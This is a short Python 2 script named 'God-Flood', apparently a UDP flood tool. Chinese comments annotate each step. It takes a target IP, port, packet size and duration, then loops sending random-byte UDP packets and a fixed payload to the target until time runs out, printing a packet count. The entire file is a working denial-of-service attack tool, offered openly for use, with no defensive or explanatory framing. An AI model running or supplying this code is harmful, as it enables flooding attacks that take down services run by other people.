#!/usr/bin/env python
# God-Flood by LiGhT
import socket
import random
import time
#   import os
import sys

# 检查命令行参数数量是否正确
if len(sys.argv) < 5:
    print("God-Flood By LiGhT")
    sys.exit("Usage: python " + sys.argv[0] + " <ip> <port> <size> <time>")

# 获取命令行参数
ip = sys.argv[1]  # 目标IP地址
port = int(sys.argv[2])  # 目标端口号
size = int(sys.argv[3])  # UDP数据包的大小
t1m3 = int(sys.argv[4])  # 攻击持续的时间（秒）
timeout = time.time() + t1m3  # 设置攻击结束的时间点
sent = 0  # 已发送的数据包数量
data = "f1a525da11f6".decode("hex")  # 定义要发送的数据

# 主循环
while True:
    try:
        # 检查是否超过攻击时间
        if time.time() > timeout:
            break
        else:
            pass

        # 创建一个UDP套接字
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # 创建一个TCP套接字（此脚本中的TCP部分未使用）
        syn = socket.socket()

        # 再次创建一个UDP套接字
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)

        # 如果端口号为0，则随机选择一个端口
        if port == 0:
            port = random.randrange(1, 65535)

        # 连接到目标IP和端口，并发送数据
        s.connect((ip, port))
        s.send(data)

        # 生成随机大小的数据包
        bytes = random._urandom(size)

        # 使用UDP套接字发送数据包
        syn.connect((ip, port))  # 注意这里应该是udp.sendto，syn.connect是错误的
        udp.sendto(bytes, (ip, port))

        # 增加已发送的数据包计数，并打印信息
        sent = sent + 1
        print(
            "DuMPiNG TaRGeT: %s | PoRT: %s | SiZe: %s | TiMe: %s | PaCKeT: %s"
            % (ip, port, size, t1m3, sent)
        )
        # sys.stdout.write("\x1b]2;Total Packets Sent: %s\x07" % sent)  # 可选：更新窗口标题显示发送的总包数

    # 捕获键盘中断信号
    except KeyboardInterrupt:
        print(" Stopping Flood!")
        sys.exit()

    # 捕获套接字错误
    except socket.error as msg:
        print("Socket Couldn't Connect")
        print("Error: %s" % msg)
        sys.exit()
